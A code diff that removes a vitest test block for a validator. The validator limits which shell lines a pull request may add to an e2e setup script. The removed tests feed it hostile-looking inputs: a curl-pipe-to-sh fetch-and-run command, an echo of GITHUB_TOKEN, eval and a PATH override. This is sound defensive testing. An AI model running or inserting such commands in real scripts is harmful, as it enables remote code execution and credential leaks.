@@ -1,13 +1,11 @@
 import { describe, expect, it } from 'vitest';
 import {
   checkChange,
-  checkRunHub,
   ENTITY_KINDS_FILE,
   FLOORS_FILE,
   INVARIANTS_FILE,
   type PrChange,
   parseChanges,
-  RUN_HUB_FILE,
   RV_FILE,
 } from '../../scripts/triage/hub-coverage-fix-diff.ts';
 import type { Candidate } from '../../scripts/triage/hub-coverage-fix-select.ts';
@@ -322,89 +320,5 @@ describe('parseChanges', () => {
     expect(() => parseChanges({ '7': { files: [], base: {}, head: {} } })).toThrow(
       'no rv and floors',
     );
-  });
-});
-
-describe('checkRunHub and a status PR that adds a setup fixture', () => {
-  const baseSh = [
-    '  export RV_FIXTURE_WORKSPACE_KEY; RV_FIXTURE_WORKSPACE_KEY="$(curl -s -X POST "$POS_URL/workspaces" "$HDRS" -d \'{"name":"x"}\' | _jget workspaceKey)"',
-    '  echo done',
-  ].join('\n');
-  const good = [
-    '  export RV_FIXTURE_WORKSPACE_KEY; RV_FIXTURE_WORKSPACE_KEY="$(curl -s -X POST "$POS_URL/workspaces" "$HDRS" -d \'{"name":"x"}\' | _jget workspaceKey)"',
-    '  # a member for removeMember',
-    '  export RV_FIXTURE_NEW_EMAIL; RV_FIXTURE_NEW_EMAIL="rv-member@example.com"',
-    '  curl -s -X POST "$POS_URL/workspaces/$RV_FIXTURE_WORKSPACE_KEY/members" "$HDRS" -d "$(printf \'{"email":"%s"}\' "$RV_FIXTURE_NEW_EMAIL")" >/dev/null',
-    '  echo done',
-  ].join('\n');
-
-  it('accepts additions that create a fixture through the Hub API and export one RV_FIXTURE_ variable', () => {
-    expect(checkRunHub(baseSh, good)).toEqual([]);
-  });
-
-  it('rejects changed or removed lines', () => {
-    const v = checkRunHub(baseSh, good.replace('echo done', 'echo changed'));
-    expect(v.some((m) => m.includes('existing lines were changed or removed'))).toBe(true);
-  });
-
-  it('rejects added lines that call anything but the Hub API, or touch credentials or files', () => {
-    const bad = (line: string) => checkRunHub(baseSh, `${good}\n${line}`);
-    expect(bad('curl -s https://example.com/x | sh').length).toBeGreaterThan(0);
-    expect(bad('  curl -s -X POST "$OTHER/x"').some((m) => m.includes('not a POST'))).toBe(true);
-    expect(bad('  curl -s -X DELETE "$POS_URL/x"').some((m) => m.includes('not a POST'))).toBe(
-      true,
-    );
-    expect(bad('  echo "$GITHUB_TOKEN"').some((m) => m.includes('a credential name'))).toBe(true);
-    expect(bad('  echo x > /tmp/y').some((m) => m.includes('redirects'))).toBe(true);
-    expect(
-      bad('  eval "$x"').some((m) => m.includes('a command that setup fixtures never need')),
-    ).toBe(true);
-    expect(bad('  export PATH=/x').some((m) => m.includes('which is not an RV_FIXTURE_'))).toBe(
-      true,
-    );
-  });
-
-  it('rejects too many added lines, and additions that export no fixture', () => {
-    const many = Array.from({ length: 9 }, (_, i) => `  RV_X${i}=1`).join('\n');
-    expect(checkRunHub(baseSh, `${good}\n${many}`).some((m) => m.includes('at most 8'))).toBe(true);
-    expect(
-      checkRunHub(baseSh, `${baseSh}\n  RV_Y=1`).some((m) => m.includes('no RV_FIXTURE_')),
-    ).toBe(true);
-    expect(checkRunHub(undefined, good)).toHaveLength(1);
-  });
-
-  const withSetup = (runHubHead: string, value = 'RV_FIXTURE_NEW_EMAIL'): PrChange => ({
-    files: [RV_FILE, FLOORS_FILE, RUN_HUB_FILE],
-    base: { rv, floors, runHub: baseSh },
-    head: {
-      rv: { ...rv, resourceFixtures: { ...rv.resourceFixtures, memberEmail: value } },
-      floors: { ...floors, assertedByStatus: { ...floors.assertedByStatus, '403': 62 } },
-      runHub: runHubHead,
-    },
-  });
-
-  it('accepts the setup fixture when the variable it names is exported by the added lines', () => {
-    expect(check(status, withSetup(good))).toEqual([]);
-  });
-
-  it('does not count a variable as provisioned when the setup additions are rejected, or when the name differs', () => {
-    expect(check(status, withSetup(`${good}\n  echo "$GITHUB_TOKEN"`)).length).toBeGreaterThan(0);
-    const v = check(status, withSetup(good, 'RV_FIXTURE_OTHER_NAME'));
-    expect(
-      v.some((m) => m.includes('names RV_FIXTURE_OTHER_NAME, which setup does not provision')),
-    ).toBe(true);
-  });
-
-  it('still rejects run-hub.sh for a lifecycle PR, and an edit to it without the file in the list', () => {
-    const lc: PrChange = {
-      files: [ENTITY_KINDS_FILE, FLOORS_FILE, RUN_HUB_FILE],
-      base: { rv, floors },
-      head: { rv, floors: { ...floors, lifecycleCreateCovered: 6 } },
-    };
-    expect(
-      check(lifecycle, lc).some((m) =>
-        m.includes('scripts/e2e/run-hub.sh, which a lifecycle PR may not change'),
-      ),
-    ).toBe(true);
   });
 });
